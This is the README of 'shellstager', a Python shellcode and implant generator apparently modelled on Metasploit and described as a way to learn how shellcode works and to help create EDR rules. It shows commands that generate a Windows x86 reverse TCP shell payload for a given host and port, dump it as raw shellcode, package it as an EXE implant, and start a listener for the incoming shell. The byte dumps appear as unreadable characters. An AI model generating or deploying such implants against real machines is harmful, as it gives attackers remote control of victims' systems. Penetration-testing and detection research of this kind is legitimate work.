# shellstager

This tool helps on Shellcode understanding and development. It also includes Service Handler to help simulating remote attacks and for possible EDR rules creation.

```
$ ~/shellstager/ python shellstager.py payload -h
usage: payload [-h] [-l] [-s SEARCH_PAYLOAD] {add,get,disasm} ...

ShellStager - Shellcode maker for penetration testing.

positional arguments:
  {add,get,disasm}
    add                 Add new Payload script.
    get                 Get Payload data.
    disasm              Show Disassembly of Payload.

optional arguments:
  -h, --help            show this help message and exit
  -l, --list-payloads   List all available Payloads.
  -s SEARCH_PAYLOAD, --search-payload SEARCH_PAYLOAD
                        List all available Payloads.
```

**Dumping raw Shellcode to commandline**
```
$ ~/shellstager/ python shellstager.py payload get --name windows/x86/shell/reverse_tcp --host 172.20.96.252 --port 4444 -f raw
`1ۉd0[
8u};}$uXP$fHP څt>I411
           JPڋډЉD$$ZZaY[QX_[)TPh)kj
h`h\PPPP@P@Ph՗jVWhtaՅt
udjjVWh_Ճ~66j@hVjhXSSjVSWh_Ճ}%Xh@jPh
                                    /0WhunMa^^
                                              $p)uVjS%
```

**Creating an EXE implant/payload**
```
$ ~/shellstager/ python shellstager.py payload get --name windows/x86/shell/reverse_tcp --host 172.20.96.252 --port 4444 -f exe
MZ@     !L!T␤␋⎽ ⎻⎼⎺±⎼▒└ ␌▒┼┼⎺├ ␉␊ ⎼┤┼ ␋┼ DOS └⎺␍␊↓
$]┴⎽┴⎽┴⎽V▒┴⎽R␋␌␤┴⎽PEL␌␉

                        @ .text` ``1ۉd0[
8u};}$uXP$fHP څt>I411                   [K&1s(1<a|,
           JPڋډЉD$$ZZaY[QX_[)TPh)kj
h`h\PPPP@P@Ph՗jVWhtaՅt
udjjVWh_Ճ~66j@hVjhXSSjVSWh_Ճ}%Xh@jPh
                                    /0WhunMa^^
                                              $p)uVjS%
```

**Running the Service Handler**
```
$ ~/shellstager/ python shellstager.py handler run --payload windows/x86/shell/reverse_tcp --host 172.20.96.252 --port 4444
[*] Started Reverse TCP handler for 172.20.96.252:4444

```

<br><br><br>
Note:<br>
*This is an attempt on understanding internals of Shellcodes in backdoors or implants if you will. Although that Metasploit was used to be written in Python, I write this as it is my way of learning things.*

<br><br>
References:
<br>MASM
<br>Metasploit
<br>Capstone
<br>Keystone
<br>pefile
